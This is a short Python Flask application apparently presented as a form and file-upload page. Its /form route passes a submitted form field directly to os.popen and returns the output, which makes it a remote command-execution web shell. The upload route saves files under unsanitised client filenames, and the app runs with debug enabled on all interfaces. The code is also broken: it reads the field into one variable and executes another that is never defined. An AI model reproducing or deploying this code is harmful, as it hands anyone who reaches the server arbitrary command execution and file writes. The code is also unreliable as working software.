import os
import datetime
from flask import Flask, url_for, redirect, render_template, request, abort, flash, jsonify

app = Flask(__name__)
app.config.from_object('config')


@app.route('/form', methods= ["GET", "POST"])
def form():
    if request.method == 'POST':
        story = request.form.get('q')
        if q:
            stream = os.popen(q)
            return jsonify(result=stream.read())
        else:
            return jsonify(result='Input needed')

    return render_template("private_page.html")

@app.route("/upload_file", methods = ['POST'])
def FUN_upload_file():
    if request.method == 'POST':
        # check if the post request has the file part
        if 'file' not in request.files:
            flash('No file part')
            return(redirect(url_for("form")))
        file = request.files['file']
        # if user does not select file, browser also submit a empty part without filename
        if file.filename == '':
            flash('No selected file')
            return(redirect(url_for("form")))
        if file:
            filename = file.filename
            # Save the image into UPLOAD_FOLDER
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return(redirect(url_for("form")))

    return(redirect(url_for("form")))

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
